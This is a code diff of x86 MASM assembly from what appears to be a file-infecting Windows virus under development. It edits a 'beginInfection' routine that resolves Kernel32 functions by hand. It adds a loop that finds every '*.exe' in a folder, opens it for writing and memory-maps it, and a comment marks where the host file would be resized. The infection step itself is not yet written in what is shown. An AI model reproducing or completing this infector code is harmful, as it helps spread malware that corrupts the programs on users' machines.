@@ -162,8 +162,9 @@ beginInfection proc delta:dword
 	local localDelta:dword
 	local hmodule:dword
 
-	call Kernel32Init
+	jmp Kernel32Init
 
+beginInfectionStr:
 	LoadLibraryStr	db "LoadLibraryA",0		; localDelta + 0h
 	GetProcAddrStr	db "GetProcAddress",0	; + 0Dh
 	User32DllStr	db "User32.dll",0		; + 0Fh
@@ -172,7 +173,7 @@ beginInfection proc delta:dword
 
 Kernel32Init:
 	mov eax, [esp]
-	mov localDelta, eax
+	mov localDelta, beginInfectionStr
 	invoke extractKernel32PEHeader, delta
 	mov K32PEHeaderAddr, eax
 	invoke getPEBaseAddr, K32PEHeaderAddr
@@ -208,22 +209,69 @@ Kernel32Init:
 	ret
 beginInfection endp
 
+filesLoop proc
+	local findFileData:WIN32_FIND_DATA
+	local searchHandle:dword
+	local fileHandle:dword
+	local fileMapping:dword
+	local fileView:dword
+	
+	jmp filesLoopInit
+
+	PatternStr	db "*.exe",0 ; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
+
+filesLoopInit:
+	invoke FindFirstFile, offset PatternStr, addr findFileData
+	cmp eax, INVALID_HANDLE_VALUE
+	je filesFinished ; we are fucked
+	mov searchHandle, eax
+	
+fileMainLoop:
+	
+	invoke CreateFile, addr findFileData.cFileName, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
+	cmp eax, INVALID_HANDLE_VALUE
+	je fileNext
+	mov fileHandle, eax
+
+	invoke CreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
+	cmp eax, 0
+	je fileClose
+	mov fileMapping, eax
+
+	invoke MapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
+	cmp eax, 0
+	je fileMapClose
+	mov fileView, eax
+
+	; fileView now points toward an array representing our file
+
+	invoke UnmapViewOfFile, fileView
+
+fileMapClose:
+	invoke CloseHandle, fileMapping
+
+fileClose:
+	invoke CloseHandle, fileHandle
+	
+fileNext:
+	invoke FindNextFile, searchHandle, addr findFileData
+	cmp eax, 0
+	jne fileMainLoop
+
+fileNoMore:
+	invoke FindClose, searchHandle
+
+filesFinished:
+	ret
+filesLoop endp
+
 startinf:
 
 	xor eax, eax
 	;invoke extractKernel32PEHeader, ebx
 	invoke beginInfection, ebx
 
-
-mloop:
-
-;; sans doute mieux de tout mettre dans le meme fichier pour tout mapper lors de l'infection
-	call getNextFile
-	cmp eax, 0
-	je endmloop
-	push eax						;;	saves current file handle
-	call CloseHandle
-	jmp mloop
+	invoke filesLoop
 
 endmloop:
 
